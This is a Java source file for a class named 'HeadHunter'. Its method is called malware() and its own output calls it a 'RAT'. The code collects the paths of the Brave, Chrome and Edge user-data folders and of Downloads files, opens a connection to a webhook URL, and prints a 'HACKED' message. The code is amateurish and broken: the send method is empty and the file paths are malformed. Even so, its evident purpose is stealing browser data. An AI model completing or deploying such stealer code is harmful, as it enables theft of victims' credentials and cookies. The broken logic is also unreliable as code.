import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;

public class HeadHunter {
    File file;

    public File getFile() {
        return file;
    }

    void malware(String url) {
        ArrayList<String> files = new ArrayList<String>();
        String brave_data = new String(System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
        String chrome_data = new String(System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data");
        String edge_data = new String(System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
        String jarfile = new String(System.getenv("DOWNLOADS") + "" + ".jar");
        String exefile = new String(System.getenv("DOWNLOADS") + "" + ".exe");
        files.add(brave_data); // this can affect me, cause i use Brave as my main browser
        files.add(chrome_data); // gets chrome user data folder
        files.add(edge_data); // gets edge user data folder
        files.add(jarfile); // gets jar files
        files.add(exefile); // gets exe files
        if (files.add(brave_data) ||
                files.add(chrome_data) || files.add(edge_data)
                || files.add(jarfile) || files.add(exefile)) {
            try {
                HttpURLConnection webhook = (HttpURLConnection) new URL(url).openConnection();
            } catch (IOException e1) {
                e1.printStackTrace();
            }
            try {
                Runtime.getRuntime().exec("Chrome.exe");
                Runtime.getRuntime().exec("Brave Browser.exe");
                Runtime.getRuntime().exec("cmd.exe /c echo HACKED BY HeadHunter RAT!");
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                InetAddress.getLocalHost().getHostAddress();
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }
        }

    }

    public void send(File file, URL url) {
    }

}